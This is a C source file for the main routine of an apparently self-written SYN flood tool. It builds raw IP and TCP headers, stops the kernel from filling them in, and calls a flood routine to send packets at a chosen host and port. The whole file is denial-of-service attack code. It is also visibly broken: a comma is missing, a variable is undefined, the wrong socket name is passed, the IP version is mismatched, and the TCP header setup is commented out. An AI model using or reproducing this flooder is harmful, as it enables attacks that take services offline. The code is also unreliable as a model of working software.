#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"

int main(int argc,char* argv[]){
	srand(time(NULL));
    if(argc==0) fprintf(stdout,"Usage: syn-flood --dest www.host.domain --port port");
	else{	
		
		/** Example source address and source port **/
		char* source_address = "127.0.0.1";
		char* source_port    = "1338";
		/** Obtain the socket**/
		int sock = get_socket_descriptor();
		
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
		
		/** Init sockaddr_in with my network information **/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);
		
		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		TCP_HEADER *tcp_hdr = (TCP_HEADER *)(buffer + sizeof(IP_HEADER));
		
		
		/** Fill your headers (IP && TCP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CRITIC_TOS,IP_DEFAULT_LENGTH,IP_DEFAULT_IDENTIFICATION,0,0,0
					  IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_TCP_PROTOCOL,0);
		//set_tcp_header_syn_flood(tcp_hdr,source_port,remote_port,buffer);
		
		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Run your application type (Syn flood in this case)**/ 
		run_flood(num_packets,socket,ip_hdr,myaddr,buffer);
	
	}
	return 0;
}
